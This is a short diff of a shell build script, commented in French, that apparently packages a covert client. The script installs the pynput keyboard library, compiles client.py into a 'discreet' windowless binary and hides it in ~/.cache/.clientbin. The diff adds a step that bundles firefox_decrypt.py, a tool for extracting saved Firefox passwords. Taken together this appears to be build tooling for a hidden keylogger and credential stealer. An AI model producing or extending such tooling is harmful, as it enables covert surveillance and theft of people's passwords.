@@ -27,7 +27,8 @@ pip3 install pynput --break-system-packages &>/dev/null
 
 #compilation du binaire via PyInstaller
 echo "[+] Compilation du client.py en binaire discret..."
-python3 -m PyInstaller --onefile --noconsole client/client.py &>/dev/null
+python3 -m PyInstaller --onefile --noconsole --add-data "client/firefox_decrypt.py:." client/client.py &>/dev/null
+
 
 #cache le binaire
 mkdir -p ~/.cache/.clientbin
